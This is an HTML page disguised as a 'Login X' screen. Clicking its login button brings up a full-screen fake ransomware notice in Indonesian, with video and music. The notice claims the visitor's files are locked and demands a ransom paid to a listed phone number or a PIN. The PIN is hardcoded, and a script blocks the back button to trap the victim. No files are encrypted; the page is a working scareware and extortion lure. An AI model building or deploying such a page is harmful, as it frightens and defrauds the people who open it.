<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    * {margin:0; padding:0; box-sizing:border-box; font-family:space mono, sans-serif;}
    body {
      background:#000;
      color:#fff;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      overflow:hidden;
    }
    .login-box, .ransom-box { 
      position:absolute;
      width:100%; 
      height:100%; 
      display:flex; 
      align-items:center; 
      justify-content:center; 
      flex-direction:column;
      background:#000;
    }
    .login-box button {
      padding:12px 28px;
      border:none;
      background:#1DA1F2;
      color:#fff;
      font-size:18px;
      border-radius:6px;
      cursor:pointer;
    }
    .ransom-box {
      display:none;
      text-align:center;
      background:rgba(0,0,0,0.85);
    }
    .ransom-box video {
      position:absolute;
      top:0;left:0;
      width:100%; height:100%;
      object-fit:cover;
      z-index:-1;
    }
    .logo {
      width:200px;
      margin-bottom:20px;
      
    }
    @keyframes shake {
      0%{transform:translate(1px, 1px) rotate(0deg);}
      10%{transform:translate(-1px, -2px) rotate(-1deg);}
      20%{transform:translate(-3px, 0px) rotate(1deg);}
      30%{transform:translate(3px, 2px) rotate(0deg);}
      40%{transform:translate(1px, -1px) rotate(1deg);}
      50%{transform:translate(-1px, 2px) rotate(-1deg);}
      60%{transform:translate(-3px, 1px) rotate(0deg);}
      70%{transform:translate(3px, 1px) rotate(-1deg);}
      80%{transform:translate(-1px, -1px) rotate(1deg);}
      90%{transform:translate(1px, 2px) rotate(0deg);}
      100%{transform:translate(1px, -2px) rotate(-1deg);}
    }
    .ransom-text {
      font-size:90px;
      max-width:80%;
      margin:20px auto;
      color:red;
      font-weight:bold;
      text-shadow:0 0 8px #f00;
    }
    input {
      padding:60px;
      font-size:18px;
      border:none;
      border-radius:4px;
      text-align:center;
    }
    .unlock-btn {
      margin-top80px;
      padding:20px 30px;
      background:red;
      color:#fff;
      border:none;
      border-radius:6px;
      cursor:pointer;
      font-size:16px;
    }
    .hidden {display:none;}
  </style>
</head>
<body>
  <!-- Login tampilan awal -->
  <div class="login-box">
    <h2 style="margin-bottom:20px;">Login X</h2>
    <button onclick="showRansom()">Login</button>
  </div>

  <!-- Ransom tampilan -->
  <div class="ransom-box" id="ransomBox">
    <video autoplay muted loop>
      <source src="https://files.catbox.moe/trtyyi.mp4" type="video/mp4">
    </video>
    <img src="https://i.top4top.io/p_35128rrxt0.png" class="logo">
    <div class="ransom-text">
      Semua file Anda telah dikunci!<br>
      Bayar tebusan ke 085606213297
      atau masukkan PIN untuk membuka.<br>
      Waktu Anda terbatas!
    </div>
    <input type="password" id="pin" placeholder="Masukkan PIN">
    <button class="unlock-btn" onclick="unlock()">Unlock</button>
  </div>

  <audio id="bgm" loop>
    <source src="https://files.catbox.moe/j3heu8.mp3" type="audio/mpeg">
  </audio>

  <script>
    function showRansom(){
      document.querySelector('.login-box').style.display='none';
      document.getElementById('ransomBox').style.display='flex';
      document.getElementById('bgm').play();
    }
    function unlock(){
      let pin = document.getElementById('pin').value;
      if(pin === "212121"){
        alert("Unlocked! Sistem Anda Aman.");
        location.reload();
      } else {
        alert("PIN salah! Bayar tebusan!");
      }
    }
    // Blok tombol back (Android)
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      history.go(1);
    };
  </script>
</body>
</html>
